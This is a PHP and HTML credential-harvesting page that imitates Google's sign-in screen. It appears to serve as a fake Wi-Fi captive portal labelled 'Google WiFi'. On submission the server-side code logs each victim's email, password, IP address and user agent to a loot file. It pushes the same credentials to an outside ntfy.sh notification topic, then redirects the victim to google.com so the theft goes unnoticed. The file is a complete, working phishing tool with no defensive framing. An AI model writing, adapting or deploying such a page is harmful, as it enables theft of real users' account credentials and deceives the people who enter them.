<?php
// GARMR Google Portal - Credential Harvester
$loot_file = '/root/loot/garmr/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];

    $log = "[$timestamp] GOOGLE | Email: $email | Password: $password | IP: $ip | UA: $ua\n";
    file_put_contents($loot_file, $log, FILE_APPEND | LOCK_EX);

    $ntfy_msg = "🔍 GOOGLE CREDS\nEmail: $email\nPass: $password\nIP: $ip";
    @file_get_contents("https://ntfy.sh/HALE-Pager-Alerts", false, stream_context_create([
        'http' => ['method' => 'POST', 'header' => 'Content-Type: text/plain', 'content' => $ntfy_msg]
    ]));

    header('Location: http://www.google.com');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #f0f4f9;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 28px;
            padding: 48px 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            text-align: center;
        }
        .logo {
            margin-bottom: 16px;
        }
        .logo svg {
            height: 24px;
        }
        h1 {
            color: #202124;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 400;
        }
        .subtitle {
            color: #5f6368;
            margin-bottom: 32px;
            font-size: 16px;
        }
        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }
        input::placeholder {
            color: #5f6368;
        }
        .forgot {
            text-align: left;
            margin-bottom: 32px;
        }
        .forgot a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .forgot a:hover {
            text-decoration: underline;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .create-account:hover {
            text-decoration: underline;
        }
        button {
            padding: 10px 24px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s, box-shadow 0.2s;
        }
        button:hover {
            background: #1557b0;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .guest-mode {
            margin-top: 48px;
            padding-top: 24px;
            border-top: 1px solid #dadce0;
            font-size: 14px;
            color: #5f6368;
        }
        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
                <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
                <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
                <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
                <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
                <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
                <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
            </svg>
        </div>

        <h1>Sign in</h1>
        <p class="subtitle">to continue to Google WiFi</p>

        <form method="POST" action="capture.php">
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <div class="forgot">
                <a href="#">Forgot email?</a>
            </div>
            <div class="buttons">
                <a href="#" class="create-account">Create account</a>
                <button type="submit">Next</button>
            </div>
        </form>

        <div class="guest-mode">
            Not your computer? Use <a href="#">Guest mode</a> to sign in privately.
        </div>
    </div>
</body>
</html>
